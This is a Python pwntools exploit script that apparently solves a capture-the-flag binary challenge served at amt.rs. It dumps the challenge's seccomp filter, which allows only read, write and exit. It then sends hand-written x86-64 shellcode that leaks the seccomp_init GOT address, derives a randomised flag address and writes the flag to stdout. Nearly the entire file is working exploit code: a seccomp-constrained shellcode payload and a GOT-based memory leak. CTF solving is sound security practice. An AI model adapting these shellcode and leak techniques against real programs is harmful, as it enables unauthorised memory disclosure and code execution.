#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

offset = 0

if len(argv) >= 2 and argv[1] == "r":
    p = remote("amt.rs",  31173)
    # idk why offset is difference
    offset = 0x1000 * 2
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+89
		b *main+643
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

"""
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
"""

bss = 0x404000+0x100

sc = f'''
    // write(stdout, seccomp_init@got, 8)
    mov rdi, 1
    mov rsi, {elf.got["seccomp_init"]}
    mov rdx, 8
    mov rax, 1
    syscall
    // get random_val_addr
    mov rcx, [{elf.got["seccomp_init"]}]
    sub rcx, 0x0d3d0
    add rcx, 0x59000
    add rcx, {offset}
    // write(stdout, random_val_addr, 4)
    mov rdi, 1
    mov rsi, rcx
    mov rdx, 4
    mov rax, 1
    syscall
    // read(stdin, bss, 0x100)
    xor rdi, rdi
    mov rsi, {bss}
    mov rdx, 0x8
    xor rax, rax
    syscall
    // write(stdout, flag_addr, 0x50)
    mov rdi, 1
    mov rsi, [{bss}]
    mov rdx, 0x30
    mov rax, 1
    syscall
    // exit
    xor rdi, rdi
    mov rax, 60
    syscall
'''

p.recvuntil(">")
p.send(asm(sc))

p.recvuntil("\x20")

# leak seccomp_init@got
leak = u64(p.recv(8))
seccomp_base = leak - 0x0d3d0
log.info("seccomp base: " + hex(seccomp_base))
# get address of random val
rand_val_addr = seccomp_base + 0x59000
log.info("radom value @ " + hex(rand_val_addr))
# calc flag address
rand_val = u32(p.recv(4))
log.info("rand_val: " + hex(rand_val))
offset = rand_val & ~0xFFF
flag_addr = 0x1337000 + offset
log.info("flag_addr: " + hex(flag_addr))
# send flag address (recv at 69 line)
p.send(p64(flag_addr))

p.interactive()
